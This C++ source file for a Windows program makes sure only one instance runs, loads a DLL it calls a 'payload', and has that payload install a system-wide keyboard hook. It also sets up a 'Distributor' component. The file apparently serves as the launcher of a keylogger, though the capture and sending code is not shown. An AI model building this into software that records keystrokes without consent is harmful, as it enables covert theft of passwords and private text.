#include "Application.h"

Application::Application(std::string const& appliPath)
	: _appliPath(appliPath)
{
	_payload = NULL;
}

Application::~Application()
{
	if (_payload) {
		_payload->deleteKeyboardHook();
	}
}

void Application::init(void)
{
	try {
		if (Application::Existing()) {
			throw (std::runtime_error("Application already launched"));
		}

		StaticTools::CreateFolder(StaticTools::GetProjectResourceDirectory());

		_distributor = std::make_shared<Distributor>();
		_distributor->init();

		_dllLoader.load(StaticTools::GetDLLPath().c_str());
		_payload = _dllLoader.getInstance();
		_payload->setApplicationPath(_appliPath);
		_payload->setDistributor(_distributor);
		_payload->createKeyboardHook();
	}
	catch (std::exception const& e) {
		throw (e);
	}
}

void Application::loop(void)
{
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

void Application::close(void)
{
	_distributor->destroy();
	if (_payload) {
		_payload->deleteKeyboardHook();
	}
}

bool Application::Existing(void)
{
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);
	if (Process32First(snap, &process)) {
		while (Process32Next(snap, &process))
		{
			if (strcmp(process.szExeFile, APP_NAME) == 0
				&& process.th32ProcessID != GetCurrentProcessId()) {
				CloseHandle(snap);
				return (true);
			}
		} 
	}
	CloseHandle(snap);
	return (false);
}